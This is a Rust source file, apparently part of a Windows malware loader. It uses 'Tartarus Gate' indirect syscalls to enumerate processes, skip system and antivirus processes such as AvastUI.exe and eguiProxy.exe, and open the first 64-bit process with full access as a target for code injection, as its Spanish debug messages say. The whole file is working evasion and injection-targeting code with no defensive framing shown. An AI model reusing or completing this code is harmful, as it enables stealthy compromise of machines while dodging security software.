use std::ptr::null_mut;

use windows::Win32::Foundation::{HANDLE, OBJECT_ATTRIBUTE_FLAGS};
use windows::Win32::System::Threading::IsWow64Process;
use windows::Win32::System::WindowsProgramming::{SYSTEM_PROCESS_INFORMATION, CLIENT_ID};
use windows::Wdk::Foundation::OBJECT_ATTRIBUTES;
use windows::core::BOOL;

use crate::common::utils::NULL;
use crate::{debug, tartarusgate};

pub fn get_process_info() -> Result<HANDLE, Box<dyn std::error::Error>> {
    unsafe {
        let mut size_buf: usize = 0;

        let _ = tartarusgate!("NtQuerySystemInformation", 5, NULL, 0, &mut size_buf as *mut usize);
        debug!("El tamaño de la estructura es de: {:?}", size_buf);

        let mut buffer: Vec<u8> = vec![0; size_buf as usize + 0x1000];

        let status = tartarusgate!("NtQuerySystemInformation", 5, buffer.as_mut_ptr() as *mut _ as usize, buffer.len() as usize, &mut size_buf as *mut usize);
        if status != 0 {
            return Err("No se pudo obtener informacion del proceso".into());
        }

        let mut offset: usize = 0;
        loop {
            let spi = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;

            let pid = (*spi).UniqueProcessId;
            let name = if (*spi).ImageName.Buffer.is_null() {
                 "<no name>".to_string()
            } else {
                let len = (*spi).ImageName.Length as usize / 2;
                let slice = std::slice::from_raw_parts((*spi).ImageName.Buffer.0, len);
                String::from_utf16_lossy(slice)
            };

            let black_process: &[&str] = &["svchost.exe", "eServiceHost.exe", "csrss.exe", "smss.exe",
                "lsass.exe", "System", "Registry", "eOppFrame.exe", "AggregatorHost.exe", "dllhost.exe", "eguiProxy.exe",
                "AvastUI.exe", "CompPkgSrv.exe", "sihost.exe", "RuntimeBroker.exe", "taskhostw.exe"];

            if black_process.contains(&name.as_str()) {
                offset += (*spi).NextEntryOffset as usize;
                continue
            }

            let mut object = OBJECT_ATTRIBUTES {
                Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
                RootDirectory: HANDLE(null_mut()),
                ObjectName: null_mut(),
                Attributes: OBJECT_ATTRIBUTE_FLAGS(0),
                SecurityDescriptor: null_mut(),
                SecurityQualityOfService: null_mut(),
            };

            let mut clientid = CLIENT_ID {
                UniqueProcess: pid,
                UniqueThread: HANDLE(null_mut()),
            };

            let mut handle = HANDLE(null_mut());
            let status = tartarusgate!("NtOpenProcess", &mut handle as *mut _ as usize, 0x001F0FFF as usize, &mut object as *mut _ as usize, &mut clientid as *mut _ as usize);

            if status == 0 {
                debug!("{pid:?} - {name}");

                let mut is_wow64: BOOL = BOOL(0);
                let _ = IsWow64Process(handle, &mut is_wow64)?;

                if is_wow64.as_bool() != true {
                    debug!("Proceso a inyectar encontrado");
                    debug!("{pid:?} - {name}");
                    return Ok(handle)
                }
            }

            if (*spi).NextEntryOffset as usize == 0 {
                break;
            }

            offset += (*spi).NextEntryOffset as usize;
        }

        Err("No se pudo encontrar un proceso".into())
    }
}
